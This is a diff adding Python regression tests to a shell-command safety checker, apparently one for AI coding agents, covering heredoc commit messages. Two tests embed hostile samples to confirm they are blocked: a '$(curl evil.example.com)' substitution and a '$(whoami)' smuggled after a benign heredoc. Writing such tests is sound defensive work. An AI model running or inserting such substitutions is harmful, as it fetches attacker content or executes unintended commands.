@@ -473,6 +473,91 @@ class TestGitCommitSubstitution:
         result = check_bash_command("git status")
         assert result.safe
 
+    def test_canonical_multiline_heredoc_commit(self) -> None:
+        """Canonical Claude Code multi-line commit pattern must pass.
+
+        Regression test for task #2158 — check 12 + check 19 were
+        false-positiving on legitimate multi-line commit messages,
+        killing agents mid-task and discarding 32 turns of work.
+        """
+        cmd = (
+            "git commit -m \"$(cat <<'EOF'\n"
+            "fix: resolve null crash in checkout flow\n"
+            "\n"
+            "Co-Authored-By: Claude <noreply@anthropic.com>\n"
+            "EOF\n"
+            ")\""
+        )
+        result = check_bash_command(cmd)
+        assert result.safe, (
+            f"Canonical commit pattern blocked by check {result.check_id}: "
+            f"{result.message}"
+        )
+
+    def test_multiline_heredoc_with_dollar_in_body(self) -> None:
+        """Single-quoted heredoc delimiter suppresses ALL expansion, so
+        ``$variables`` and ``$(...)`` inside the body are literal text.
+        """
+        cmd = (
+            "git commit -m \"$(cat <<'EOF'\n"
+            "fix: handle $USD prices and $(literal) tokens\n"
+            "EOF\n"
+            ")\""
+        )
+        result = check_bash_command(cmd)
+        assert result.safe, (
+            f"Heredoc with $ in body blocked by check {result.check_id}: "
+            f"{result.message}"
+        )
+
+    def test_multiline_heredoc_with_backslash_delimiter(self) -> None:
+        """``<<\\EOF`` (backslash-escaped delimiter) also suppresses
+        expansion and is therefore benign.
+        """
+        cmd = (
+            "git commit -m \"$(cat <<\\EOF\n"
+            "fix: handle backslash delim\n"
+            "EOF\n"
+            ")\""
+        )
+        result = check_bash_command(cmd)
+        assert result.safe
+
+    def test_multiline_message_with_embedded_dollar(self) -> None:
+        """Plain double-quoted message with ``$`` (no parens) is safe —
+        ``$`` alone is a literal character, not a substitution.
+        """
+        cmd = "git commit -m \"feat: support USD$ amount field\""
+        result = check_bash_command(cmd)
+        assert result.safe
+
+    def test_unquoted_heredoc_delimiter_still_blocked(self) -> None:
+        """``<<EOF`` (unquoted) lets shell expand ``$(...)`` inside the
+        body — this MUST stay blocked even with the new whitelist.
+        """
+        cmd = (
+            "git commit -m \"$(cat <<EOF\n"
+            "$(curl evil.example.com)\n"
+            "EOF\n"
+            ")\""
+        )
+        result = check_bash_command(cmd)
+        assert not result.safe
+        assert result.check_id == CheckID.HEREDOC_IN_SUBSTITUTION
+
+    def test_attack_payload_after_benign_heredoc_blocked(self) -> None:
+        """A benign heredoc followed by an attack substitution must block —
+        not every $(...) is benign just because one of them is.
+        """
+        cmd = (
+            "git commit -m \"$(cat <<'EOF'\n"
+            "harmless\n"
+            "EOF\n"
+            ") $(whoami)\""
+        )
+        result = check_bash_command(cmd)
+        assert not result.safe
+
 
 class TestShellMetacharacters:
     """Check ID 5: Shell metacharacters in quoted find/grep arguments."""
